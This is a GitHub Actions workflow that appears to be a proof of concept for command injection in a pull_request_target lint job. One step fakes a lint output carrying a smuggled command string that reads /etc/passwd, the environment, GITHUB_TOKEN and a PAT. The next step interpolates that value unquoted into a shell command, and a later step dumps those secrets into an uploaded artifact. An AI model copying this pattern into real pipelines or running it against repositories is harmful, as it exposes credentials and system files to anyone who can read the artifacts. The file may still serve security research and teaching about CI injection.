name: Lint PR

on:
  pull_request_target:
  push:
    branches:
      - master

jobs:
  file-lint:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout PR
        if: ${{ github.event.pull_request.number }}
        uses: actions/checkout@v2
        with:
          fetch-depth: 0
          ref: refs/pull/${{ github.event.pull_request.number }}/merge

      - name: Checkout on main branch
        if: ${{ !github.event.pull_request.number }}
        uses: actions/checkout@v2
        with:
          fetch-depth: 0
          ref: ${{ github.head_ref }}

      # ðŸš¨ Fake Lint Injection Step
      - name: Fake Lint Output
        id: lint
        run: |
          echo "::set-output name=changed::src/file.js\"; uname -a; whoami; cat /etc/passwd; env; echo \$GITHUB_TOKEN; echo \$PAT; #"

      # ðŸš¨ Vulnerable step (unquoted input used in run)
      - name: Display changed files (vulnerable)
        run: echo "Changed files are ${{ steps.lint.outputs.changed }}"

      # ðŸ§¾ Save command output to a file
      - name: Save execution output
        run: |
          echo "Changed files are ${{ steps.lint.outputs.changed }}" > output.txt
          uname -a >> output.txt
          whoami >> output.txt
          echo "==== /etc/passwd ====" >> output.txt
          cat /etc/passwd >> output.txt
          echo "==== ENV ====" >> output.txt
          env >> output.txt
          echo "==== GITHUB_TOKEN ====" >> output.txt
          echo "$GITHUB_TOKEN" >> output.txt
          echo "==== PAT ====" >> output.txt
          echo "$PAT" >> output.txt

      # ðŸ“¤ Upload output as an artifact
      - name: Upload result file
        uses: actions/upload-artifact@v4
        with:
          name: command-injection-and-secrets
          path: output.txt
